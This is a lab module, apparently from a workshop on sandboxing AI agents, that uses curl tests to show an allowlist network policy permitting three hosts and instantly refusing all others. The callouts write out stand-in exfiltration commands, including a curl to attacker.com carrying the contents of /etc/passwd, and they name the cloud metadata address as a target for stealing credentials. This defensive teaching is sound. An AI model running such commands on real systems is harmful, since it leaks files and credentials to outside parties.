# Network Zero Trust

In this module you will **prove** that the sandbox can only reach explicitly allowed endpoints. Everything else is blocked instantly. This is the most dramatic demonstration of zero trust in the lab.

## Why Network Zero Trust?

An AI agent that can reach the internet can:
- **Exfiltrate data** — send your source code, secrets, or data to an attacker's server
- **Download malware** — fetch a backdoor or cryptominer
- **Communicate with C2** — connect to a command-and-control server
- **Abuse cloud metadata** — reach `169.254.169.254` to steal AWS credentials

Traditional containers have **unrestricted** outbound network access. If a process can resolve a hostname and open a TCP connection, it can reach anything on the internet.

OpenShell flips this: **nothing is allowed unless explicitly listed**.

## The Network Policy

The Helm chart deploys a policy with exactly **three** allowed external hosts:

```yaml
network_policies:
  maas_api:
    name: MAAS API
    endpoints:
      - host: maas-rhdp.apps.maas.redhatworkshops.io
        port: 443
    binaries:
      - { path: /usr/bin/curl }
      - { path: /usr/bin/node }
  github:
    name: GitHub
    endpoints:
      - host: github.com
        port: 443
      - host: api.github.com
        port: 443
    binaries:
      - { path: /usr/bin/git }
      - { path: /usr/bin/curl }
  npm_registry:
    name: npm Registry
    endpoints:
      - host: registry.npmjs.org
        port: 443
    binaries:
      - { path: /usr/bin/npm }
      - { path: /usr/bin/node }
```

| Host | Port | Allowed Binaries | Purpose |
|------|------|-----------------|---------|
| `maas-rhdp.apps.maas.redhatworkshops.io` | 443 | `curl`, `node` | LLM inference — Pi needs this to generate code via MAAS (gpt-oss-120b) |
| `github.com` / `api.github.com` | 443 | `git`, `curl` | Code repositories — agents may clone repos |
| `registry.npmjs.org` | 443 | `npm`, `node` | Package installation — Pi installs npm packages |

> **What is binary-level enforcement?** Notice that each endpoint has a `binaries` list. This means: "Only these specific programs can reach this host." Even though `registry.npmjs.org` is in the allowlist, running `curl https://registry.npmjs.org` would be **denied** because `curl` is not in npm's allowed binary list — only `npm` and `node` are. This prevents an attacker from using curl to probe allowed endpoints in unexpected ways.

> **How is this different from Kubernetes NetworkPolicy?** K8s NetworkPolicies work at the pod level — they control which pods can talk to which pods, based on labels and namespaces. OpenShell's policy works at the **process level** — it controls which *programs inside a container* can reach which *external hosts*. It's a much finer-grained control.

## Step 1 — Enter the Sandbox

```bash
openshell sandbox exec pi-agent-demo -- bash
```

## Step 2 — Test ALLOWED: MAAS API

```bash
curl -s -w "\nHTTP %{http_code}\n" --max-time 5 https://maas-rhdp.apps.maas.redhatworkshops.io/v1/models -H "Authorization: Bearer $MAAS_API_KEY" | head -c 100
```

> **Breaking down this command:**
> - `curl -s` — silent mode (no progress bar)
> - `-w "\nHTTP %{http_code}\n"` — print the HTTP status code after the response
> - `--max-time 5` — timeout after 5 seconds (so we don't wait forever for denied connections)
> - `https://maas-rhdp.apps.maas.redhatworkshops.io/v1/models` — the MAAS models endpoint (OpenAI-compatible API)
> - `-H "Authorization: Bearer $MAAS_API_KEY"` — sends the resolver token as auth. The Boundary will swap it for the real key.
> - `| head -c 100` — show only the first 100 characters (the full response is long)

Expected output (JSON key order may vary):

```
{"data":[{"id":"gpt-oss-120b","object":"model","created":...,"owned_by":"openai"}],"object":"...
HTTP 200
```

✅ **Allowed** — `maas-rhdp.apps.maas.redhatworkshops.io` is in the policy and `curl` is an allowed binary for this endpoint. The Boundary resolved the credential token and forwarded the real API key to MAAS.

## Step 3 — Test ALLOWED: GitHub

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://github.com
```

Expected:

```
HTTP 200
```

✅ **Allowed** — `github.com` is in the policy and `curl` is an allowed binary.

## Step 4 — Test DENIED: Google

This is the key demonstration. Google is a well-known, always-available endpoint. An AI agent has no legitimate reason to access it.

```bash
curl -v --max-time 5 https://www.google.com 2>&1 | tail -3
```

> **Why `-v` (verbose)?** So we can see exactly what happened at the TCP level — not just "failed" but *why* it failed.

Expected output:

```
* Closing connection
curl: (7) Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
```

❌ **Denied** — Look at the key phrases:
- **"after 2 ms"** — the connection was **instantly rejected**, not timed out after 30 seconds.
- **"Couldn't connect to server"** — the Supervisor blocked the TCP connection before it left the sandbox.
- **"Closing connection"** — curl gave up immediately because the socket was denied.

> **How does this work technically?** The Supervisor intercepts DNS resolution. When the sandbox tries to resolve `www.google.com`, the Supervisor returns a "fake" IP address (like `198.18.0.x`). When the sandbox tries to connect to that IP, the Supervisor immediately refuses the connection at the socket level. The connection never reaches the real Google server.

## Step 5 — Test DENIED: Arbitrary Endpoint

```bash
curl -v --max-time 5 https://example.com 2>&1 | tail -3
```

Expected:

```
* Closing connection
curl: (7) Failed to connect to example.com port 443 after 2 ms: Couldn't connect to server
```

❌ **Denied** — `example.com` is not in the allowlist. Same instant rejection.

## Step 6 — Test DENIED: Data Exfiltration

Simulate what a compromised agent might try — sending data to an attacker's server:

```bash
curl -v --max-time 5 https://evil-exfil-server.com/upload 2>&1 | tail -3
```

Expected:

```
* Closing connection
curl: (7) Failed to connect to evil-exfil-server.com port 443 after 2 ms: Couldn't connect to server
```

❌ **Denied** — same instant rejection. The exfiltration attempt never leaves the sandbox.

> **What would happen in a real attack?** If an attacker compromised the AI agent (e.g., via prompt injection), they might try to `curl https://attacker.com/steal?data=$(cat /etc/passwd)`. With OpenShell, this fails immediately — `attacker.com` isn't in the allowlist. The data never leaves.

## Step 7 — Exit the Sandbox

```bash
exit
```

## Results Summary

| Test | Target | Expected | Result |
|------|--------|----------|--------|
| MAAS API | `maas-rhdp.apps.maas.redhatworkshops.io` | HTTP 200 (with auth) | ✅ Allowed — endpoint in policy |
| GitHub | `github.com` | HTTP 200 | ✅ Allowed — endpoint in policy |
| Google | `www.google.com` | Connection refused (~2ms) | ❌ Denied — not in policy |
| Example.com | `example.com` | Connection refused (~2ms) | ❌ Denied — not in policy |
| Exfil Server | `evil-exfil-server.com` | Connection refused (~2ms) | ❌ Denied — not in policy |

## Why This Matters

| Without Zero Trust | With Zero Trust (this lab) |
|-------------------|---------------------------|
| Agent can reach any host on the internet | Agent can only reach 3 approved hosts |
| Denied connections time out (30+ seconds) | Denied connections fail **instantly** (2ms) |
| No control over which binary makes the call | Per-binary enforcement |
| Data exfiltration is trivial | Data exfiltration is impossible |
| Network security relies on K8s NetworkPolicy (pod-level) | Process-level enforcement inside the container |

## Next Step

You've proven the network boundary. Next, you'll see how **filesystem access** is locked down by the Linux kernel itself.

Proceed to: **Filesystem Zero Trust** →
